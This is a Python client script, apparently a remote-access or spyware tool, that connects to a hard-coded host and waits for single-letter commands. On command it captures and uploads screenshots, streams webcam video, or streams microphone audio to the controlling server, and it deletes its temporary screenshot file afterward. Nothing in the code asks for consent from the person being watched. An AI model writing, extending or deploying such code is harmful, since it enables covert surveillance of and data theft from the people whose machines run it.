#!/usr/bin/env python3
import socket 
import os 
import sys
import time
import pyscreenshot
import tempfile
import webStreamer
import threading
import platform

sock = socket.socket()
host = '192.168.0.106'
port = 8080
filepath = tempfile.gettempdir() + "/temp_screen.png"

def connect():
    try:
        sock.connect((host,port))
        print("Connected to server: " + host)
    except:
        print("Failed connecting to server!...")
        sys.exit()

def ControlCenter():
    while True:    
        cmd = sock.recv(1024).decode()
        
        if cmd == "S" or cmd == "s":
            take_screenshot()
        elif cmd == "R" or cmd == "r":
            share_screen()
        elif cmd == "W" or cmd == "w":
            video = webStreamer.VideoStreamer("client", sock)
            video.sendVideo()
        elif cmd == "M" or cmd == "m":
            my_OS = platform.system()   
            sock.send(my_OS.encode()) 
            
            #continue running only if client is on Windows or Linux
            if my_OS != "Darwin":
                server_OS = sock.recv(1024).decode() #check server platform 
                if server_OS != "Darwin":
                    mic = webStreamer.MicStreamer("client", sock)
                    mic.sendMic()
        else:
            print("\nServer closed - Exiting...")
            sock.close()
            sys.exit()
            break
        
def share_screen():
    print("share screen")
   
def take_screenshot():
    #Capture screen
    img = pyscreenshot.grab()
    img.save(filepath)
   
    #Send file to server
    filesize = os.path.getsize(filepath)
    sock.send(str(filesize).encode('utf-8'))
    
    with open(filepath ,'rb') as f:
        bytesToSend = f.read(1024)
        sock.send(bytesToSend)
        while bytesToSend != "":
            bytesToSend = f.read(1024)
            sock.send(bytesToSend)
            status = sock.recv(1024)
            if status == "Download Finished!".encode('utf-8'):
                break
    
    #File was sent
    os.remove(filepath) #delete temporary file

if __name__ == '__main__':
    connect()
    ControlCenter()
